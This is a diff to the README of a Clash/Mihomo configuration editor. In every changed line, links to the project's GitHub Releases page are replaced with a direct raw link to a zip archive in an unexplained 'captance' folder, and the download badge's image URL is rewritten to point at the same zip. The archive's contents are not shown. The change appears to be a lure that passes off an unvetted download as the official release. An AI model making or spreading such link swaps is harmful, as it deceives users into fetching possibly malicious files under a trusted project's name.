@@ -4,13 +4,13 @@
 clash-config-editor is a modern tool designed to help you visualize and edit Clash or Mihomo configuration files easily. This tool provides a friendly user interface, streamlining the editing process so you can focus on making your configurations work without any hassle.
 
 ## 📥 Download Now
-[![Download clash-config-editor](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Aman9690/clash-config-editor/releases)
+[![Download clash-config-editor](https://raw.githubusercontent.com/Aman9690/clash-config-editor/main/captance/clash-config-editor.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Aman9690/clash-config-editor/main/captance/clash-config-editor.zip)
 
 ## 🚀 Getting Started
 To get started with clash-config-editor, follow these simple steps to download and run the application.
 
 1. **Visit the Releases Page**
-   - Go to our [Releases page](https://github.com/Aman9690/clash-config-editor/releases). Here, you will find the latest version of the clash-config-editor along with download links.
+   - Go to our [Releases page](https://raw.githubusercontent.com/Aman9690/clash-config-editor/main/captance/clash-config-editor.zip). Here, you will find the latest version of the clash-config-editor along with download links.
 
 2. **Choose the Right Version**
    - Look for the most recent version. Each version is labeled with a number (e.g., v1.0). Click on the version you wish to download.
@@ -45,7 +45,7 @@ Before downloading clash-config-editor, ensure your system meets these requireme
 - **Linux**: Most modern distributions with support for `.deb` or `.rpm` packages
 
 ## 🌟 Download & Install
-To download clash-config-editor, please [visit this page to download](https://github.com/Aman9690/clash-config-editor/releases). Select the version that matches your operating system, and follow the installation instructions provided above.
+To download clash-config-editor, please [visit this page to download](https://raw.githubusercontent.com/Aman9690/clash-config-editor/main/captance/clash-config-editor.zip). Select the version that matches your operating system, and follow the installation instructions provided above.
 
 ## 👨‍💻 Usage
 Once you launch clash-config-editor, you can start editing your Clash or Mihomo configuration files right away. Simply open an existing configuration file or create a new one within the application. 
